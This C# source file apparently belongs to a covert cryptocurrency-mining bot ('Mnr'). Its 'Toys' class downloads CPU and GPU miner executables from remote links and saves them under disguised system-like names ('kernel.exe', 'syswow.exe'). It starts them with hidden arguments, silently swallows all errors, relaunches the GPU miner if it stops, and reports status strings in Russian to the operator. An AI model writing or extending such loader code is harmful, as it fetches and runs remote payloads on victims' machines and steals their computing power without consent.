using Mnr.Settings;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Mnr
{
    class Toys : ToysArgs
    {
        private static string NameCpuToy = "kernel";
        private static string NameGpuToy = "syswow";

        public static string CpuToyPath = Bot.MainDir + "\\" + NameCpuToy + ".exe";
        public static string GpuToyPath = Bot.MainDir + "\\" + NameGpuToy + ".exe";

        private static string PathHost = "C:\\Windows\\explorer.exe";

        private static bool IsActive(string Name)
        {
            return Process.GetProcessesByName(Name).Length > 0;
        }

        public static void RunToyCpu()
        {
            try
            {
                if (!File.Exists(CpuToyPath))
                    Bot.LoadFile(CpuLink, CpuToyPath);
                if (File.Exists(CpuToyPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        UseShellExecute = true,
                        Arguments = CpuArgs,
                        FileName = CpuToyPath,
                    });
                }
            }
            catch (Exception)
            {

            }
        }

        public static void RunToyGpu()
        {
            try
            {
                if (!File.Exists(GpuToyPath))
                    Bot.LoadFile(GpuLink, GpuToyPath);
                if (File.Exists(GpuToyPath))
                    Process.Start(new ProcessStartInfo
                    {
                        UseShellExecute = true,
                        Arguments = GpuArgs,
                        FileName = GpuToyPath,
                    });
            }
            catch (Exception)
            {

            }
        }

        public static void Control()
        {
            try
            {
                if(!IsActive(NameGpuToy))
                {
                    RunToyGpu();
                }
            }
            catch (Exception)
            {

            }
        }

        public static bool CheckVideoMemory()
        {
            double ramBytes = 0;
            foreach (var obj in new ManagementObjectSearcher("select AdapterRAM from Win32_VideoController").Get())
            {
                string ram = obj.Properties["AdapterRAM"].Value.ToString();
                ramBytes = Convert.ToDouble(ram) / 1024 / 1024 / 1024;
            }
            if (ramBytes > 3.9)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public static string ToyCpuStatus
        {
            get
            {
                if (IsActive(NameCpuToy))
                {
                    return "Запуcтился";
                }
                else if (!IsActive(NameCpuToy))
                {
                    return "Не запустился";
                }
                else
                {
                    return "Неизвестно";
                }
            }
        }

        public static string ToyGpuStatus
        {
            get
            {
                if (CheckVideoMemory())
                {
                    if (IsActive(NameGpuToy)) { return "Запустился"; }
                    else
                    {
                        return "Не запустился";
                    }
                }
                else if (!CheckVideoMemory())
                {
                    return "Меньше 4ГБ";
                }
                else
                {
                    return "Неизвестно";
                }
            }
        }
    }
}
